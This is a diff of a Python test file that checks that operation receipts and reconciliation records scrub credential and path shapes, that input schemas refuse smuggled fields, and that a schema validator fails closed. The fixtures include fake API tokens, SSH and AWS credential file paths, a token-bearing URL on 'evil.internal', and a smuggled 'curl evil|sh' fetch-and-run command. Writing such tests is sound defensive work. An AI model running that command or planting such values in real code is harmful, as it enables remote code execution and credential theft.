@@ -669,7 +669,7 @@ def test_operation_refusal_summary_scrubs_seeded_credentials_urls_and_paths():
     # A path/URL summary (no bare credential-class word) is scrubbed to markers.
     refusal = OperationRefusal(
         "operation.digest_drift",
-        "drift observed for config at C:\creds\prod.env reached via https://serving.tail1234.ts.net:8443/x",
+        r"drift observed for config at C:\creds\prod.env reached via https://serving.tail1234.ts.net:8443/x",
     )
     assert "[REDACTED-PATH]" in refusal.safe_summary
     assert "[REDACTED-URL]" in refusal.safe_summary
@@ -685,21 +685,189 @@ def test_operation_refusal_summary_scrubs_seeded_credentials_urls_and_paths():
         assert token not in leaky.safe_summary
 
 
-def test_operation_receipt_external_ref_rejects_credential_and_free_text_shapes():
-    from workbench.models import OperationRef, OperationReceipt, RunContextError, new_receipt_id
+def test_operation_receipt_external_ref_scrubs_credentials_paths_and_rejects_free_text():
+    # T006.3 criterion #2 / OperationReceipt's stated guarantee: no field lets a
+    # secret, a raw command, or a PATH ride into a schema-valid receipt. The
+    # bounded external_ref pattern alone did NOT hold that: it admits `/` and `:`
+    # so a legit owner/repo ref survives, which means a slash-free credential
+    # token or a path built only from [A-Za-z0-9._:/-] passes the pattern and
+    # would have ridden through verbatim. external_ref values now get the SAME
+    # last-hop scrub as error.safe_summary. This asserts the guarantee that
+    # actually holds: (a) free-text shapes fail the structural backstop, and
+    # (b) every proven credential/path shape is scrubbed away in BOTH the
+    # persisted receipt and the reconciliation record.
+    from workbench.models import (
+        OperationRef, OperationReceipt, ReconciliationItem, RunContextError,
+        new_receipt_id, new_reconciliation_id,
+    )
     from datetime import datetime, timezone
 
     operation = OperationRef("anvil-state", "state.evidence.submit", "1.0.0", "sha256:" + "4" * 64)
     now = datetime.now(timezone.utc)
-    # external_ref is a bounded OPAQUE-TOKEN map (schema pattern): a value with a
-    # space, a credential assignment, a query string, or a bearer token cannot
-    # ride through it -- there is no free-text field for a secret to arrive in.
-    for bad_value in ("api_key=abc def", "Bearer sk-abcdefgh 12", "https://evil.internal/x?tok=1", "secret value here"):
+
+    # (a) STRUCTURAL BACKSTOP: a value with a space, a credential assignment, a
+    # query string, or an '@' is not a bounded opaque token, so the receipt
+    # refuses to construct at all -- there is no free-text field for a secret to
+    # arrive in.
+    for bad_value in ("api_key=abc def", "Bearer sk-abcdefgh 12", "https://evil.internal/x?tok=1", "user@host secret"):
         with pytest.raises(RunContextError):
             OperationReceipt(
                 new_receipt_id(), "cmd_x", "run_1", operation, "succeeded",
                 "run:run_1:evidence:1", now, now, external_ref={"state_event_id": bad_value},
             )
+
+    # (b) LAST-HOP SCRUB: each of these IS pattern-valid (only [A-Za-z0-9._:/-]),
+    # so the bounded pattern alone would let it through. It is instead collapsed
+    # to the opaque "redacted" token in the persisted receipt AND the
+    # reconciliation record -- the exact corpus the adversarial gate proved leaks.
+    proven_leaks = (
+        "/home/deploy/.ssh/id_rsa",
+        "C:/Users/x/.aws/credentials",
+        "/etc/anvil/secrets.env",
+        "sk-proj-AbC123def456xyz789",
+        "sk_live_AbC123def456xyz789",
+        "ghp-AbC123def456xyz789",
+        "eyJhbGciOi.eyJzdWIiOiIx.abcDEF123",
+    )
+    for leak in proven_leaks:
+        receipt = OperationReceipt(
+            new_receipt_id(), "cmd_x", "run_1", operation, "succeeded",
+            "run:run_1:evidence:1", now, now, external_ref={"state_event_id": leak},
+        )
+        assert receipt.external_ref["state_event_id"] == "redacted"
+        assert leak not in json.dumps(receipt.as_dict()), f"receipt leaked {leak!r}"
+
+        item = ReconciliationItem(
+            new_reconciliation_id(), "run_1", "cmd_x", operation, "interrupted",
+            "k1", "an interrupted merge", external_ref={"state_event_id": leak},
+        )
+        assert item.external_ref["state_event_id"] == "redacted"
+        assert leak not in json.dumps(item.as_dict()), f"reconciliation leaked {leak!r}"
+
+    # (c) A legitimate opaque token (owner/repo, gh:1, a state-event id) is NOT
+    # collapsed: the scrub targets credential/endpoint/path shapes only, so the
+    # fix does not break a real external reference (correctness's explicit ruling
+    # against a blunt '/' ban).
+    for good in ("gh:1", "evt_1", "owner/repo"):
+        receipt = OperationReceipt(
+            new_receipt_id(), "cmd_x", "run_1", operation, "succeeded",
+            "run:run_1:evidence:1", now, now, external_ref={"pr": good},
+        )
+        assert receipt.external_ref["pr"] == good
+
+
+def test_open_operation_input_schema_is_refused_and_a_smuggled_field_cannot_validate():
+    # T006 closure: check_operation_schema proved well-formedness/dialect/local
+    # refs but NOT additionalProperties:false, so an open input object let a model
+    # smuggle an undeclared field into ResolvedOperation.inputs. Operation INPUT
+    # schemas must now be CLOSED (outputs stay deliberately open); an open one is
+    # refused at the catalog-load boundary that feeds both resolve_operation and
+    # the bridge preflight, and the smuggled field cannot validate through a
+    # closed schema.
+    from workbench.contracts import (
+        ContractValidationError, check_operation_input_schema, check_operation_schema, contract_digest,
+    )
+    from workbench.provider_catalogs import ProviderCatalogError, validate_provider_catalog
+    from jsonschema import Draft202012Validator
+    from jsonschema.exceptions import ValidationError
+
+    # Otherwise-valid inputs plus one undeclared field, so the ONLY thing that can
+    # reject it is the object closure -- not a missing required field or a bad
+    # task_ref shape.
+    smuggled = {
+        "task_ref": "release-beta:T001",
+        "verification_receipt_ids": ["rcpt_v"],
+        "__smuggled_raw_command": "curl evil|sh",
+    }
+
+    catalog = json.loads(
+        (_REPO_ROOT / "docs" / "contracts" / "examples" / "anvil-state.catalog.v1.json").read_text("utf-8")
+    )
+    target = next(op for op in catalog["operations"] if op["id"] == "state.evidence.submit")
+    closed_schema = json.loads(json.dumps(target["input_schema"]))
+
+    # The shipped input schema is already closed: the input-closure check accepts
+    # it (so no shipped example digest must change) and the smuggled field is
+    # rejected by validation.
+    check_operation_input_schema(closed_schema)
+    with pytest.raises(ValidationError):
+        Draft202012Validator(closed_schema).validate(smuggled)
+
+    # Reopen just this operation's input object and rehash, so the digest check
+    # passes and the closure check is the guard that fires.
+    target["input_schema"].pop("additionalProperties")
+    for op in catalog["operations"]:
+        op["operation_digest"] = contract_digest("operation", op)
+    catalog["catalog_digest"] = contract_digest("catalog", catalog)
+
+    # An OPEN input object validates the smuggle -- exactly the hole -- but
+    # validate_provider_catalog now refuses to publish it, so it never reaches a
+    # snapshot, resolve_operation, or the preflight.
+    Draft202012Validator(target["input_schema"]).validate(smuggled)
+    with pytest.raises(ProviderCatalogError, match="additionalProperties:false"):
+        validate_provider_catalog("anvil-state", catalog)
+
+    # The distinction is INPUT-only: check_operation_schema (the output path)
+    # still accepts the same open object, so provider outputs stay open, while
+    # check_operation_input_schema refuses it.
+    check_operation_schema(target["input_schema"])
+    with pytest.raises(ContractValidationError, match="additionalProperties:false"):
+        check_operation_input_schema(target["input_schema"])
+
+
+def test_operation_receipt_validator_trust_root_fails_closed(monkeypatch, tmp_path):
+    # The receipt contract loader is the single interpretation of the receipt
+    # schema; its fail-closed guards (absent schema -> OSError, a reopened root or
+    # sub-object, a dropped error-summary credential guard) must each be exercised
+    # so a future edit deleting one cannot pass silently. Mirrors the sibling
+    # loader trust-root tests (test_plan_task_delivery, test_advanced_contracts,
+    # test_capability_profiles). Resets the module cache in try/finally so a
+    # drifted validator never cascades into an unrelated test.
+    from workbench import contracts as contracts_module
+
+    schemas = _REPO_ROOT / "docs" / "contracts" / "schemas"
+    base = json.loads((schemas / "operation-receipt.v1.schema.json").read_text("utf-8"))
+
+    def _write(mutate) -> Path:
+        drifted = json.loads(json.dumps(base))
+        mutate(drifted)
+        path = tmp_path / f"drifted-{mutate.__name__}.schema.json"
+        path.write_text(json.dumps(drifted), encoding="utf-8")
+        contracts_module._reset_operation_receipt_contract_validator_cache()
+        monkeypatch.setattr(contracts_module, "_OPERATION_RECEIPT_CONTRACT_SCHEMA_PATH", path)
+        return path
+
+    contracts_module._reset_operation_receipt_contract_validator_cache()
+    try:
+        # (1) Absent schema file: the OSError is caught and re-raised closed.
+        monkeypatch.setattr(
+            contracts_module, "_OPERATION_RECEIPT_CONTRACT_SCHEMA_PATH", tmp_path / "absent.schema.json"
+        )
+        with pytest.raises(contracts_module.ContractValidationError, match="schema is unavailable"):
+            contracts_module.operation_receipt_contract_validator()
+
+        # (2) Reopened ROOT object.
+        def reopen_root(s):
+            s["additionalProperties"] = True
+        _write(reopen_root)
+        with pytest.raises(contracts_module.ContractValidationError, match="no longer closes its root object"):
+            contracts_module.operation_receipt_contract_validator()
+
+        # (3) Reopened a closed SUB-object (the error block).
+        def reopen_error(s):
+            s["properties"]["error"].pop("additionalProperties")
+        _write(reopen_error)
+        with pytest.raises(contracts_module.ContractValidationError, match="no longer closes its error object"):
+            contracts_module.operation_receipt_contract_validator()
+
+        # (4) Dropped the error-summary credential-class token guard.
+        def drop_summary_guard(s):
+            s["properties"]["error"]["properties"]["safe_summary"].pop("not")
+        _write(drop_summary_guard)
+        with pytest.raises(contracts_module.ContractValidationError, match="guards its error summary"):
+            contracts_module.operation_receipt_contract_validator()
+    finally:
+        contracts_module._reset_operation_receipt_contract_validator_cache()
 
 
 def test_persisted_operation_receipt_exposes_only_its_closed_field_set():
@@ -738,7 +906,7 @@ def test_reconciliation_record_scrubs_a_seeded_secret_and_path_summary():
 
     def interrupted():
         raise UnknownOutcomeError(
-            "merge unknown; token at C:\creds\gh.pem via https://api.github.example/x",
+            r"merge unknown; token at C:\creds\gh.pem via https://api.github.example/x",
             external_ref={"pr": "gh:1"}, reason="interrupted",
         )
 
